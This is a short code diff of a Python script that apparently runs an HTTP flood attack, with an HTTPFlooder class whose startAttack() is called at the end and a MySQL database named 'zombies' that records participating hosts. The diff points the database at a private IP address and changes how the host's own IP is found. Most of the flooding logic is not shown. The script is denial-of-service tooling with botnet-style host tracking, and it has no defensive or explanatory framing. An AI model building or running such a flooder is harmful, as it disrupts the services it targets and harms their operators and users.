@@ -9,7 +9,7 @@ import requests
 import argparse
 from urllib.parse import urlparse, unquote
 
-sqlserver = "localhost"
+sqlserver = "172.16.28.173"
 db = "zombies"
 table = "zombie"
 sqluser = "root"
@@ -163,17 +163,15 @@ class HTTPFlooder():
             for t in threads:
                 t.join()
 
-
 def get_host_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(('8.8.8.8', 80))
+        s.connect((sqlserver, 3306))
         ip = s.getsockname()[0]
     finally:
         s.close()
 
     return ip
-
 
 def write_to_db(host, user, pwd, db, port):
     db = pymysql.connect(host=host, user=user,
@@ -252,7 +250,3 @@ if __name__ == "__main__":
 
     fd = HTTPFlooder()
     fd.startAttack()
-
-
-
-
